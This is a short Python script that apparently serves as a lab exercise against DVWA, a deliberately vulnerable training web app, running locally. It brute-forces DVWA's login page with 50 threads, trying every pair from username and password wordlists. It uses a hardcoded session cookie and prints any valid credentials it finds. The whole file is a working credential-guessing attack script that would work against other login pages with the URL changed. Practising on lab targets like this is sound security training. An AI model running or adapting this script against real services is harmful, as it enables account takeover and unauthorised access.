#encoding: utf-8

import os
from concurrent.futures.thread import ThreadPoolExecutor
import itertools

import requests

WORKERS = 50

BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def read_file(path):
    with open(path, 'r') as fhandler:
        yield from fhandler


def brute_force(data):
    addr, username, password, headers = data
    username, password = username.strip(), password.strip()

    url = 'http://{0}:{1}/DVWA-1.9/vulnerabilities/brute/'.format(*addr)
    params = {
        'username' : username,
        'password' : password,
        'Login' : 'Login'
    }

    response = requests.get(url, params, headers=headers)
    if response.ok and \
        response.text.find('Welcome to the password protected area') != -1:
        return True, username, password
    return False, username, password


def main(addr, headers):
    usernames = read_file(os.path.join(BASE_DIR, 'user.txt'))
    passwords = read_file(os.path.join(BASE_DIR, 'password.txt'))
    datas = itertools.product([addr], usernames, passwords, [headers])

    executor = ThreadPoolExecutor(max_workers=WORKERS)
    for success, username, password in executor.map(brute_force, datas):
        if success:
            print('+', username, password)


if __name__ == '__main__':
    server = ('localhost', 80, )
    headers = {
        'Cookie' : 'security=medium; PHPSESSID=kcguk4lfhk88iugf0rtggr1s83',
    }
    main(server, headers)